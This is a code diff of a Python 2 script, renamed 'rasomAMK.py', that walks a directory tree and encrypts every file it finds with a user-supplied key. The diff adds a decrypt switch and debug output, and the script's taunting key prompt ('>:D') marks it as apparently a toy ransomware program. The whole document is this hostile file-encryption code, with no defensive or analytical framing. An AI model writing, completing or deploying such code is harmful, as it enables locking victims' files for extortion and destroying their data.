@@ -17,8 +17,8 @@ def getAllFiles():
     dirs = []
     for dirName, subdirList, fileList in os.walk(dir_path):
         for fname in fileList:
-            if (fname != 'python_file_crypter.py'):
-                dirs.append(dirName + "\\" + fname)
+            if (fname != 'rasomAMK.py'):
+                dirs.append(dirName + "/" + fname)
     return dirs
 
 def pad(message):
@@ -26,6 +26,7 @@ def pad(message):
     
 def encryption(key):
     files = getAllFiles()
+    print files
     for file in files:
         file_content = None
         with open(file, 'rb') as fo:
@@ -38,6 +39,7 @@ def encryption(key):
 
 def decrypt(key):
     files = getAllFiles()
+    print files
     for file in files:
         file_content = None
         with open(file, 'r') as fo:
@@ -49,7 +51,7 @@ def decrypt(key):
 
 def get_args():
     try:
-        opts, args = getopt.getopt(sys.argv[1:], '', ["key="])
+        opts, args = getopt.getopt(sys.argv[1:], '', ["key=", "decrypt"])
         return opts
     except getopt.GetoptError as err:
         sys.exit(err)
@@ -57,15 +59,20 @@ def get_args():
 def main():
     key = ''
     options = get_args()
+    is_decrypt = False
     for option, data in options:
         if option in ("--key"):
           key = data
+        if option in ('--decrypt'):
+          is_decrypt = True
     if not key:
       print 'The key is required. >:D: --key=something'
       return 0
     
-    encryption(key)
-    # decrypt(key)
+    if not is_decrypt:
+        encryption(key)
+        return 0
+    decrypt(key)
 
 if __name__ == "__main__":
   main()    
